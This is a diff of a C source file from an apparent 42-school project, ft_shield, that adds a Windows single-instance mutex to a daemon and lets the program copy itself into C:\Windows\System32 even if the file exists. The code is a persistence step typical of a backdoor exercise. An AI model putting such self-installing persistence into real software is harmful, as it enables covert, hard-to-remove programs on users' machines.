@@ -6,7 +6,7 @@
 /*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/10/19 18:02:57 by zcadinot          #+#    #+#             */
-/*   Updated: 2026/10/20 16:11:17 by zcadinot         ###   ########.fr       */
+/*   Updated: 2026/10/20 16:54:44 by zcadinot         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,8 +16,22 @@
 
 int mode_daemon()
 {
-    printf("Mode_Daemon\n");
-    fflush(stdout);
+    HANDLE mutex = CreateMutexW(NULL, FALSE, L"Local\\MonApplicationMutex");
+
+    if (mutex == NULL)
+    {
+        printf("Erreur mutex : %lu\n", (unsigned long)GetLastError());
+        CloseHandle(mutex);
+        return (1);
+    }
+
+    if (GetLastError() == ERROR_ALREADY_EXISTS)
+    {
+        printf("Already running...\n");
+        CloseHandle(mutex);
+        return (0);
+    }
+    CloseHandle(mutex);
     while (1)
     {
         continue;
@@ -48,7 +62,8 @@ int mode_normal()
 
     const char *dst = "C:\\Windows\\System32\\ft_shield.exe";
 
-    if (!CopyFileA(mpath, dst, TRUE))
+
+    if (!CopyFileA(mpath, dst, TRUE) && GetLastError() != ERROR_FILE_EXISTS)
     {
         printf("Erreur : %lu\n", (unsigned long)GetLastError());
         return (1);
